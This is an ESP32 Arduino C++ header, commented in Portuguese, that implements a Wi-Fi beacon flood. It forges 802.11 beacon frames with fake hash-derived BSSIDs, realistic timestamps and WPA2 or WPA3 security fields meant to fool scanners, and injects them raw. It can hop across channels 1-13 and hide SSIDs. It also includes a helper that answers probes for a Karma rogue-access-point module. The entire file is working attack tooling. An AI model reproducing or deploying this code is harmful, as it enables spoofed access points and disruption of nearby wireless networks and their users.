#pragma once
#include <Arduino.h>
#include <esp_wifi.h>
#include <vector>
#include "../utils/logger.h"
#include "../config.h"

class BeaconFlood {
public:
    static BeaconFlood& get() { static BeaconFlood inst; return inst; }

    bool    running      = false;
    bool    channelHop   = false; // percorre canais 1-13 automaticamente
    bool    hiddenMode   = false; // emite beacons com SSID oculto (ssidLen=0)
    bool    wpa3Mode     = false; // inclui SAE AKM junto com PSK (confunde scanners)
    uint8_t channel      = 1;
    uint8_t hopCh        = 1;
    std::vector<String> ssids;
    uint32_t sentCount   = 0;

    void addSSID(const String& s) { ssids.push_back(s); }
    void clearSSIDs() { ssids.clear(); }

    void start(uint8_t ch = 1, bool hop = false, bool hidden = false) {
        channel     = ch;
        hopCh       = ch;
        channelHop  = hop;
        hiddenMode  = hidden;
        sentCount   = 0;
        running     = true;
        LOG.warn("[BEACON FLOOD] Iniciado: " + String(ssids.size()) + " SSIDs" +
                 String(hop ? " +HOP(1-13)" : " ch") + (hop ? "" : String(ch)) +
                 String(hidden ? " +HIDDEN" : "") +
                 String(wpa3Mode ? " +WPA3" : ""));
    }

    void stop() {
        running = false;
        LOG.info("[BEACON FLOOD] Parado | enviados: " + String(sentCount));
    }

    void tick() {
        if (!running || ssids.empty()) return;
        static uint8_t  idx  = 0;
        static unsigned long last = 0;
        if (millis() - last < BEACON_INTERVAL) return;
        last = millis();

        uint8_t ch = channelHop ? hopCh : channel;
        sendBeacon(ssids[idx].c_str(), ch, hiddenMode);
        sentCount++;

        idx = (idx + 1) % ssids.size();
        if (channelHop && idx == 0) {
            hopCh = (hopCh % 13) + 1; // avança canal após ciclo completo de SSIDs
        }
    }

    // Envia beacon em resposta a uma probe — usado pelo Karma para flooding agressivo
    void sendBeaconFor(const char* ssid, uint8_t ch) {
        sendBeacon(ssid, ch, false);
        sentCount++;
    }

private:
    void sendBeacon(const char* ssid, uint8_t ch, bool hidden) {
        uint8_t ssidLen = hidden ? 0 : (uint8_t)strlen(ssid);
        if (ssidLen > 32) ssidLen = 32;

        // BSSID único por SSID via hash FNV-1a (mesmo algoritmo do Karma)
        uint32_t h = 2166136261u;
        for (int i = 0; i < (int)strlen(ssid); i++) h = (h ^ (uint8_t)ssid[i]) * 16777619u;
        uint8_t fakeBSSID[6] = {
            0x02,                          // locally administered, unicast
            (uint8_t)(h >> 24),
            (uint8_t)(h >> 16),
            (uint8_t)(h >>  8),
            (uint8_t)(h & 0xFF),
            (uint8_t)(ch ^ 0xA5)
        };

        uint8_t frame[200] = {};
        uint8_t off = 0;

        frame[off++] = 0x80; frame[off++] = 0x00; // Beacon
        frame[off++] = 0x00; frame[off++] = 0x00; // Duration
        // DA broadcast
        memset(frame + off, 0xFF, 6); off += 6;
        memcpy(frame + off, fakeBSSID, 6); off += 6; // SA
        memcpy(frame + off, fakeBSSID, 6); off += 6; // BSSID
        frame[off++] = 0x00; frame[off++] = 0x00; // Seq

        // Timestamp (incrementa para parecer AP real ativo)
        uint64_t ts = esp_timer_get_time();
        memcpy(frame + off, &ts, 8); off += 8;
        frame[off++] = 0x64; frame[off++] = 0x00; // Beacon interval 100 TU
        // Capabilities: ESS=1, Privacy=1, ShortSlot=1
        frame[off++] = 0x31; frame[off++] = 0x04;

        // SSID IE (vazio se hidden)
        frame[off++] = 0x00; frame[off++] = ssidLen;
        if (ssidLen > 0) { memcpy(frame + off, ssid, ssidLen); off += ssidLen; }

        // Supported Rates
        frame[off++] = 0x01; frame[off++] = 0x08;
        const uint8_t rates[] = {0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
        memcpy(frame + off, rates, 8); off += 8;

        // DS Parameter Set
        frame[off++] = 0x03; frame[off++] = 0x01; frame[off++] = ch;

        // Traffic Indication Map (TIM) — torna beacon mais realista
        frame[off++] = 0x05; frame[off++] = 0x04;
        frame[off++] = 0x00; frame[off++] = 0x01; frame[off++] = 0x00; frame[off++] = 0x00;

        // RSN IE — WPA2-PSK CCMP
        const uint8_t rsn_wpa2[] = {
            0x30, 0x14,
            0x01, 0x00,
            0x00, 0x0F, 0xAC, 0x04, // group: CCMP
            0x01, 0x00,
            0x00, 0x0F, 0xAC, 0x04, // pairwise: CCMP
            0x01, 0x00,
            0x00, 0x0F, 0xAC, 0x02, // AKM: PSK
            0x00, 0x00
        };
        // RSN IE — WPA3-SAE (modo wpa3Mode: adiciona AKM SAE + PMF obrigatório)
        const uint8_t rsn_wpa3[] = {
            0x30, 0x18,
            0x01, 0x00,
            0x00, 0x0F, 0xAC, 0x04,
            0x01, 0x00,
            0x00, 0x0F, 0xAC, 0x04,
            0x02, 0x00,             // 2 AKMs: PSK + SAE
            0x00, 0x0F, 0xAC, 0x02, // PSK
            0x00, 0x0F, 0xAC, 0x08, // SAE (WPA3)
            0xCC, 0x00              // RSN caps: MFP capable + required
        };
        if (wpa3Mode) {
            memcpy(frame + off, rsn_wpa3, sizeof(rsn_wpa3)); off += sizeof(rsn_wpa3);
        } else {
            memcpy(frame + off, rsn_wpa2, sizeof(rsn_wpa2)); off += sizeof(rsn_wpa2);
        }

        // Extended Capabilities IE
        frame[off++] = 0x7F; frame[off++] = 0x08;
        memset(frame + off, 0x00, 8); off += 8;

        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        esp_wifi_80211_tx(WIFI_IF_AP, frame, off, false);
    }
};
